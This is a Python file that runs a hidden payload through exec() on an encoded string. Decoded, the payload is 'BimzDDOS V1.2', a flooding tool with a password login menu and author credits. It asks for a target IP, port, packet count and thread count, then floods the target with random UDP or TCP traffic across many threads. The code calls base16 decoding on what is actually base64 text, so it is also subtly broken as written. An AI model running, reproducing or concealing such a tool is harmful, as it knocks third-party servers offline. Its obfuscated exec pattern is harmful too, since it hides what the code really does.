import base64
exec(base64.b16decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojQmltekRET1MgVjEuMgppbXBvcnQgc29ja2V0CmltcG9ydCByYW5kb20KaW1wb3J0IHRocmVhZGluZwppbXBvcnQgb3MKaW1wb3J0IHRpbWUKaW1wb3J0IHN5cwoKI3RhbXBpbGFuCnBhc3N3b3JkID0iQmltenpERE9TIgpwcmludCgiIiJcdTAwMWJbMzFtCltCaW16el0gPT0+IExvZ2luTWVudSEhIiIiKQpmb3IgaSBpbiByYW5nZSgzKToKCXB3ZCA9IGlucHV0KCJb4oCiXSBQQVNTV09SRDogIikKCWo9MwoJaWYocHdkPT1wYXNzd29yZCk6CgkJdGltZS5zbGVlcCg1KQoJCXByaW50KCJb4oCiXSBUVU5HR1UgNSBERVRJSyEhISAiKQoJCWJyZWFrCgllbHNlOgoJCXRpbWUuc2xlZXAoNSkKCQlwcmludCgiW8OXXSBQQVNTV09SRCBTQUxBSCEhISAiKQoJCWNvbnRpbnVlCnRpbWUuc2xlZXAoNSkKcHJpbnQoIlviiJpdIEJlcmhhc2lsIExvZ2luLCBXYWl0IikKdGltZS5zbGVlcCg1KQpwcmludCgiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIikKcHJpbnQoIlsrXSBUb29scyBERG9TIEJFVEEgVkVSU0lPTiBCeSBCaW16eiIpCnByaW50KCJbK10gRGlzY29yZCA6IEJpbXp6Izk5OTkiKQpwcmludCgiWytdIFlvdVR1YmUgOiBCaW16eiIpCnByaW50KCJbK10gQXV0aG9yICA6IEJpbXp6IHggS3lUZWFtIikKcHJpbnQoIlsrXSBLeVRlYW0gIDogaHR0cHM6Ly9kaXNjb3JkLmdnL1lNVDl1dFlXNVUiKQpwcmludCgiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIikKaXAgPSBzdHIoaW5wdXQoIiBCaW16eiB8IElwOiIpKQpwb3J0ID0gaW50KGlucHV0KCIgQmltenogfCBQb3J0OiIpKQpjaG9pY2UgPSBzdHIoaW5wdXQoIiBCaW16eiB8IERkb3MgR2FrPyh5L24pOiIpKQp0aW1lcyA9IGludChpbnB1dCgiIEJpbXp6IHwgUGFja2V0cygyMDAwKToiKSkKdGhyZWFkcyA9IGludChpbnB1dCgiIEJpbXp6IHwgVGhyZWFkcygxNjAwKToiKSkKZGVmIHJ1bigpOgoJZGF0YSA9IHJhbmRvbS5fdXJhbmRvbSgxNjAwKQoJaSA9IHJhbmRvbS5jaG9pY2UoKCJbKl0iLCJbIV0iLCJbI10iKSkKCXdoaWxlIFRydWU6CgkJdHJ5OgoJCQlzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pCgkJCWFkZHIgPSAoc3RyKGlwKSxpbnQocG9ydCkpCgkJCWZvciB4IGluIHJhbmdlKHRpbWVzKToKCQkJCXMuc2VuZHRvKGRhdGEsYWRkcikKCQkJcHJpbnQoaSArIiB8IEJpbXp6IEF0dGFja2luZyBTZXJ2ZXJzISEiKQoJCWV4Y2VwdDoKCQkJcHJpbnQoIlshXSBFUk9SISEgIikKCmRlZiBydW4yKCk6CglkYXRhID0gcmFuZG9tLl91cmFuZG9tKDE3KQoJaSA9IHJhbmRvbS5jaG9pY2UoKCJbKl0iLCJbIV0iLCJbI10iKSkKCXdoaWxlIFRydWU6CgkJdHJ5OgoJCQlzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQoJCQlzLmNvbm5lY3QoKGlwLHBvcnQpKQoJCQlzLnNlbmQoZGF0YSkKCQkJZm9yIHggaW4gcmFuZ2UodGltZXMpOgoJCQkJcy5zZW5kKGRhdGEpCgkJCXByaW50KGkgKyIgfCBCaW16eiBBdHRhY2tpbmcgU2VydmVycyEhIikKCQlleGNlcHQ6CgkJCXMuY2xvc2UoKQoJCQlwcmludCgiWypdIEVST1IhISAiKQoKZm9yIHkgaW4gcmFuZ2UodGhyZWFkcyk6CglpZiBjaG9pY2UgPT0gJ3knOgoJCXRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQgPSBydW4pCgkJdGguc3RhcnQoKQoJZWxzZToKCQl0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuMikKCQl0aC5zdGFydCgp')
